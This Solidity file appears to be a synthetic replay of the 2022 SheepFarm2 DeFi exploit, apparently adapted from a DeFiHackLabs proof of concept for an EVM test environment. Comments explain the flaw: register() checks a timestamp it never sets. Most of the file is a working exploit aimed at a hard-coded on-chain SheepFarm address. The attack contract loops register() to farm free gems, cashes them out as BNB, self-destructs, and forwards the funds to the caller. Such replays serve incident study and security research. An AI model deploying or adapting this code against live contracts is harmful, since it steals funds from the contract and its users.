// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-SheepFarm2).
//
// The DeFiHackLabs PoC (test/SheepFarm2_exp.sol) deploys 4 throw-away
// `AttackContract`s from the test contract (ContractTest) in a loop, and each
// `AttackContract` runs the ENTIRE attack inside its constructor — looping
// `register(neighbor)` 402 times to farm free gems, then addGems,
// upgradeVillage, sellVillage, withdrawMoney, and finally selfdestructs its
// balance back to the test (msg.sender). The test measures its own native
// balance delta over the 4 deployments (== 3.0556 BNB).
//
// The recorder's model is "deploy ONE attack contract and call one entrypoint",
// so we collapse the test's 4-deploy loop into a single synthetic exploit:
// `run()` is a faithful copy of `ContractTest.testExploit`'s body — it loops 4
// `new AttackContract{value: 5e14}()` deployments — and the AttackContract
// constructor below is a verbatim copy of the registry's AttackContract (same
// constants, same 402/5/withdrawMoney(156_000) numbers, same selfdestruct to
// msg.sender). Logic + constants are copied verbatim; only the test's
// `address(this)` recipient becomes this exploit contract, which then
// forwards the accumulated BNB to the attacker EOA at the end of run().
//
// Root cause: SheepFarm.register(neighbor) guards one-time use with
// `require(villages[user].timestamp == 0)` but NEVER writes `timestamp` (that
// is only set later in addGems/syncVillage). So a fresh address can call
// register() in a loop, accumulating `+= GEM_BONUS*2` (20) gems each time for
// free, then cash the hoard out through the deterministic gem→yield→wool→BNB
// pipeline. The missing state write makes the "one-time" guard a no-op.

interface ISheepFarm {
    function register(address neighbor) external;
    function addGems() external payable;
    function upgradeVillage(uint256 farmId) external;
    function sellVillage() external;
    function withdrawMoney(uint256 wool) external;
}

contract AttackContract {
    ISheepFarm public constant Farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
    address public constant neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;

    constructor() payable {
        for (uint256 i; i < 402; ++i) {
            Farm.register(neighbor);
        }

        Farm.addGems{value: 5e14}();

        for (uint256 i; i < 5; ++i) {
            Farm.upgradeVillage(i);
        }

        Farm.sellVillage();

        Farm.withdrawMoney(156_000);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract SheepFarm2Exploit {
    // The test contract deploys 4 AttackContracts, each funded with 5e14 wei.
    uint256 private constant ATTACK_COUNT = 4;
    uint256 private constant PER_ATTACK_FUND = 5e14;

    function run() external payable {
        for (uint256 i; i < ATTACK_COUNT; ++i) {
            new AttackContract{value: PER_ATTACK_FUND}();
        }
        // Forward any residual BNB (the 4 selfdestruct payouts) to the attacker.
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
